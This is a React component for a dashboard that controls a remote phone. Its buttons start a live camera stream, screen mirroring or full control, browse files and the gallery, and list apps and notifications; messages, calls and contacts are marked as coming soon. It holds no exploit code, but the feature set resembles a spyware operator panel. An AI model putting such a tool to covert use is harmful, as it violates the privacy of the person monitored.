import {
    Bell,
    Camera,
    ChevronRight,
    Folder,
    Image,
    LayoutGrid,
    MessageSquare,
    Monitor as MonitorIcon,
    Phone,
    RefreshCw,
    User,
    Zap
} from 'lucide-react';
import toast from 'react-hot-toast';
import { useDispatch, useSelector } from 'react-redux';
import { addPendingCommand, removePendingCommand, setCameraFrame, setIsCameraStreaming, setIsControlEnabled, setIsScreenMirroring, setScreenFrame } from '../../store/slices/remoteControlSlice';

const categories = [
  {
    title: 'Communication',
    desc: 'Messages and Contacts',
    color: 'blue',
    actions: [
      { id: 'messages', label: 'Messages', icon: <MessageSquare size={18} />, action: 'messages', comingSoon: true },
      { id: 'call_logs', label: 'Call History', icon: <Phone size={18} />, action: 'call_logs', comingSoon: true },
      { id: 'contacts', label: 'Contacts', icon: <User size={18} />, action: 'contacts', comingSoon: true },
    ],
  },
  {
    title: 'Media & Files',
    desc: 'Camera, Mirroring & Controls',
    color: 'purple',
    actions: [
      { id: 'camera', label: 'Live Camera', icon: <Camera size={18} />, action: 'camera_stream' },
      { id: 'screen_mirror', label: 'Mirror Only', icon: <MonitorIcon size={18} />, action: 'screen_share' },
      { id: 'remote_control', label: 'Full Control', icon: <MonitorIcon size={18} />, action: 'remote_control' },
      { id: 'photos', label: 'Gallery', icon: <Image size={18} />, altType: 'GET_GALLERY' },
      { id: 'files', label: 'File Browser', icon: <Folder size={18} />, action: 'files' },
    ],
  },
  {
    title: 'System',
    desc: 'Apps and Settings',
    color: 'emerald',
    actions: [
      { id: 'apps', label: 'Applications', icon: <LayoutGrid size={18} />, altType: 'GET_INSTALLED_APPS' },
      { id: 'notifications', label: 'Alerts', icon: <Bell size={18} />, altType: 'GET_NOTIFICATIONS' },
      { id: 'vibrate', label: 'Test Vibrate', icon: <Zap size={18} />, action: 'vibrate' },
    ],
  },
];

export default function CommandDashboard({ sendCommand, browseFiles }) {
  const dispatch = useDispatch();
  const { 
    cameraFrame, 
    screenFrame,
    isCameraStreaming,
    isScreenMirroring,
    pendingCommands, 
    currentPath,
    showFileExplorer,
    showNotificationsModal,
    isControlEnabled
  } = useSelector((state) => state.remoteControl);

  const isActive = (act) => {
    if (act.id === 'camera') return isCameraStreaming;
    if (act.id === 'screen_mirror') return isScreenMirroring && !isControlEnabled;
    if (act.id === 'remote_control') return isScreenMirroring && isControlEnabled;
    if (act.altType === 'GET_GALLERY') return showFileExplorer && currentPath === 'Image Gallery';
    if (act.action === 'files') return showFileExplorer && currentPath !== 'Image Gallery';
    if (act.altType === 'GET_NOTIFICATIONS') return showNotificationsModal;
    return false;
  };

  const handleAction = (act) => {
    if (act.comingSoon) {
      toast('Coming Soon!', {
        icon: '🚀',
        style: {
          borderRadius: '12px',
          background: 'var(--background)',
          color: 'var(--foreground)',
          border: '1px solid var(--border)',
        },
      });
      return;
    }

    if (act.action === 'files') {
      browseFiles();
    } else if (act.id === 'camera') {
      if (isCameraStreaming) {
        sendCommand('CAMERA_STREAM_STOP');
        dispatch(setIsCameraStreaming(false));
        dispatch(setCameraFrame(null));
        toast.success('Camera stream stopped');
      } else {
        // Validation: Block if mirroring is active
        if (isScreenMirroring) {
          toast.error('Mirroring is active. Please close Mirroring and try again.', {
             icon: '⚠️',
             duration: 4000
          });
          return;
        }
        dispatch(addPendingCommand({ type: 'CAMERA_STREAM_START' }));
        sendCommand('CAMERA_STREAM_START', { facing: 0 }, (response) => {
            dispatch(removePendingCommand({ type: 'CAMERA_STREAM_START' }));
            if (response && response.success) {
               dispatch(setIsCameraStreaming(true));
               toast.success('Live Camera active');
            } else {
               toast.error('Failed to start camera');
            }
        });
      }
    } else if (act.id === 'screen_mirror' || act.id === 'remote_control') {
      const isControl = act.id === 'remote_control';

      if (isScreenMirroring) {
        // If already mirroring, check if we are just switching modes
        if ((isControl && !isControlEnabled) || (!isControl && isControlEnabled)) {
          // Validation: For mode switching, we can still allow or ask to stop. 
          // But to follow your rule strictly: "close mirroring and try again"
          toast.error('A Mirroring session is already active. Stop it first to switch modes.', {
            icon: '⚠️'
          });
          return;
        } else {
          // Just stop
          sendCommand('SCREEN_SHARE_STOP');
          dispatch(setIsScreenMirroring(false));
          dispatch(setScreenFrame(null));
          dispatch(setIsControlEnabled(false));
          toast.success('Mirroring stopped');
        }
      } else {
        // Validation: Block if camera is active
        if (isCameraStreaming) {
          toast.error('Camera is active. Please close Camera and try again.', {
            icon: '⚠️',
            duration: 4000
          });
          return;
        }
        dispatch(addPendingCommand({ type: 'CONTROL_START' }));
        sendCommand('CONTROL_START', { control: isControl }, (response) => {
          dispatch(removePendingCommand({ type: 'CONTROL_START' }));
          if (response?.status === "COMPLETED" || response?.success) {
            dispatch(setIsScreenMirroring(true));
            dispatch(setIsControlEnabled(isControl));
            toast.success(`${isControl ? 'Remote Control' : 'Mirroring'} started`);
          } else {
            toast.error('Failed to start session');
          }
        });
      }
    }
 else if (act.altType) {
      sendCommand(act.altType);
    } else {
      sendCommand('CUSTOM', { action: act.action });
    }
  };

  return (
    <div className="relative group">
      <div className="relative bg-surface-main/30 backdrop-blur-xl border border-border-main p-8 rounded-3xl shadow-lg">
         <div className="flex flex-col md:flex-row md:items-center justify-between gap-6 mb-8">
            <div>
               <h2 className="text-2xl font-bold text-foreground-main tracking-tight mb-1">Control Panel</h2>
               <p className="text-muted-main text-sm">Tap on any feature to start controlling.</p>
            </div>
         </div>

         <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
            {categories.map((cat, i) => (
              <div key={i} className="space-y-4">
                 <div>
                    <h3 className="text-[10px] font-bold text-primary-main uppercase tracking-widest mb-1">{cat.title}</h3>
                    <p className="text-[10px] text-muted-main/60">{cat.desc}</p>
                 </div>
                 <div className="space-y-2">
                    {cat.actions.map(act => {
                      let typeKey = act.altType || act.action || 'CUSTOM';
                      if (act.id === 'screen_mirror') typeKey = 'SCREEN_SHARE_START';
                      if (act.id === 'camera') typeKey = 'CAMERA_STREAM_START';
                      
                      const isLoading = !!pendingCommands[typeKey];
                      const active = isActive(act);

                      return (
                        <button
                          key={act.id}
                          onClick={() => handleAction(act)}
                          className={`w-full flex items-center justify-between p-4 rounded-2xl border transition-all group/btn ${
                            active 
                              ? 'bg-primary-main text-white border-primary-main shadow-lg shadow-primary-main/20 scale-[1.02]' 
                              : 'bg-surface-main/50 hover:bg-surface-hover border-border-main'
                          }`}
                        >
                          <div className="flex items-center gap-3">
                             <div className={`p-2 rounded-lg transition-transform group-hover/btn:scale-110 ${
                               active ? 'bg-white/20 text-white' : 'bg-primary-main/10 text-primary-main'
                             }`}>
                                {act.icon}
                             </div>
                             <span className={`text-xs font-bold ${active ? 'text-white' : 'text-foreground-main'}`}>
                               {act.label}
                             </span>
                          </div>
                          {isLoading ? (
                              <RefreshCw className={`w-3.5 h-3.5 animate-spin ${active ? 'text-white' : 'text-primary-main'}`} />
                          ) : (
                              <ChevronRight className={`w-4 h-4 transition-all group-hover/btn:translate-x-1 ${
                                active ? 'text-white/70' : 'text-muted-main group-hover/btn:text-primary-main'
                              }`} />
                          )}
                        </button>
                      );
                    })}
                 </div>
              </div>
            ))}
         </div>
      </div>
    </div>
  );
}
